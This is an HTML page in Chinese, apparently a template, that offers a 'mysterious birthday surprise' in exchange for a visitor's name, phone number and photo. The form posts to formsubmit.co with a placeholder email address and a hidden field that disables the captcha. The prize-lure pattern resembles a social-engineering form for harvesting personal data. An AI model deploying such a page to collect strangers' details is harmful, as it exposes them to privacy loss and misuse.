<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>🎂 生日惊喜上传</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom right, #ffe4e1, #fff0f5);
      text-align: center;
      padding: 20px;
      margin: 0;
    }
    form {
      background-color: #ffffff;
      padding: 20px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      display: inline-block;
      max-width: 90%;
      width: 400px;
    }
    input, button {
      margin: 10px 0;
      padding: 12px;
      width: 100%;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      background-color: #ff69b4;
      color: white;
      border: none;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background-color: #ff1493;
    }
    h1 {
      color: #ff1493;
    }
  </style>
</head>
<body>
  <h1>🎉 生日快乐！</h1>
  <p>请填写资料以领取神秘生日惊喜！</p>

  <form action="https://formsubmit.co/你的邮箱@example.com" method="POST" enctype="multipart/form-data">
    <input type="text" name="名字" placeholder="你的名字" required>
    <input type="text" name="手机号码" placeholder="你的电话号码" required>
    <input type="file" name="照片" accept="image/*" required>

    <!-- 隐藏设置 -->
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_template" value="table">
    <input type="hidden" name="_subject" value="🎂 有人提交生日资料啦！">
    <input type="hidden" name="_next" value="ty.html">

    <button type="submit">提交 🎁</button>
  </form>
</body>
</html>
